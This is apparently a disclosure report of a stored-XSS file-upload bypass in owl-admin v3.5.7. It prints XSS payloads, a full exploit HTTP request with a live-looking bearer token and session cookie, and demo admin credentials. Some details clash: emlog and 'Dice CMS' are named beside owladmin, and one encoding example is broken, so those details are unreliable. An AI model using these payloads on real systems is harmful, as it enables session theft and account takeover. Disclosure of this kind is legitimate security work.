## Vulnerability Title: /admin-api/upload_image File Upload Bypass Lead to Stored XSS Vulnerability

- #### Vulnerability Type: /admin-api/upload_image File Upload Bypass Lead to Stored XSS Vulnerability
- #### Vendor Homepage: [https://www.emlog.net/](https://owladmin.com/site)
- #### Software Link: [https://github.com/emlog/emlog](https://github.com/slowlyo/owl-admin)
- #### Affected Software/Version: v3.5.7

## Application Demo and credentials

- URL   
[https://demo.emlog.cn/admin/account.php?action=signin](http://demo.owladmin.com/admin#/login)    
username:admin   
password:admin   

## Technical Details & Exploit:
- Location
  <img width="1356" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/95de1913-107f-4e5a-8d22-de66dbdce703">

  Upload a legitimate jpg and block the packet
  <img width="1031" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/e0f950f3-a585-42c3-b60d-6af1627ff405">
  Changing the filename suffix directly here is useless
  <img width="1023" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/865976a4-9582-4e7e-8599-8e52ca0283ea">
  However, when we change the contents of the file to specific code, it can bypass and cause xss vulnerabilities
  <img width="1048" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/c8c27613-6077-45dc-aa2e-e8b57b9828b3">
  payload：
  ```
  <img src=1 onerror=alert(console.log)>
  <ImG sRc=x onerRor=alert(1);>
  <svg><script>alert(1)</script>
  ```
  Concatenate the contents of the returned package into this url
  ```
  http://demo.owladmin.com/storage/images/[response_value].html
  ```
  <img width="1085" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/1f529dd0-2079-4223-937f-0e1734d3a6fa">
  Below is the vulnerability packet：
  ```
  POST /admin-api/upload_image? HTTP/1.1
Host: demo.owladmin.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Bearer 2890|CP3t2YpOcffkPKRGBV69ksHsAjQorKkLm4Ap43lP
Content-Type: multipart/form-data; boundary=---------------------------33414486592786013281336154478
Content-Length: 314
Origin: http://demo.owladmin.com
Sec-GPC: 1
Connection: close
Referer: http://demo.owladmin.com/admin
Cookie: owl_amdin_demo_session=eyJpdiI6IjB5M1RrTzlnY0doRjM3SHNEd0h4L1E9PSIsInZhbHVlIjoialk1b2ZBVDV6ZG1WeDFHSWNaa3M4KzkrMnp2L0NNNkV4bk1lV2ZqZVlUbnBEMzhhS0ZXa2JZWnJScCtGMnRKMnh0dmhhWTQ4V1d2c2Y4WXk4RExQRm94cnBGUUZWMi9YK25KVmttbjdPNEJKRjlORnJ4allVR3k1Nm1Lbm4wOG4iLCJtYWMiOiI2MmM4NGIyNmNiY2ZlZmZkNzZiODgyMGY0MTJkZTVjMTBlZWYyZmFiY2RjYjU3MzdhMTE4ODg4OTBlMjIxNTY2IiwidGFnIjoiIn0%3D

-----------------------------33414486592786013281336154478
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: image/jpeg

<img src=1 onerror=alert(console.log)>
<ImG sRc=x onerRor=alert(1);>
<svg><script>alert(1)</script>
-----------------------------33414486592786013281336154478--

  ```


## Impact:

XSS attacks can be used to steal sensitive information from users, such as session tokens, cookies, or personal data. Attackers can inject malicious scripts that send this information to their own servers, effectively compromising user accounts and privacy.In the Dice CMS system, it's possible to steal the administrator's cookie, thereby taking over the account.

## Mitigation/Solution:

- Encode Data on Output

Description: Ensure that any data rendered on web pages is encoded, so that browser interprets it only as data, not executable code.  This is crucial for data displayed in HTML, JavaScript, or inserted into URLs.
Implementation: Use context-appropriate encoding functions to escape special characters.  For example, in HTML contexts, < should be encoded as <, > as >, and so on.

2.  Validate and Sanitize Input

Description: All user-supplied data should be validated against a strict specification and sanitized to remove or escape harmful characters.  This includes data from query parameters, form submissions, cookies, and any external sources.
Implementation: Use libraries or functions that specifically sanitize input for XSS, removing or encoding potentially malicious characters.  Regular expressions can also be used for custom validation rules.

3.  Use Content Security Policy (CSP)

Description: CSP is a browser security feature that helps detect and mitigate certain types of attacks, including XSS and data injection attacks.  It allows you to specify the domains a browser should consider as valid sources of executable scripts.
Implementation: Implement CSP by adding the Content-Security-Policy HTTP header to instruct browsers to only execute scripts from trusted sources.  Start with a strict policy and gradually relax it as necessary.
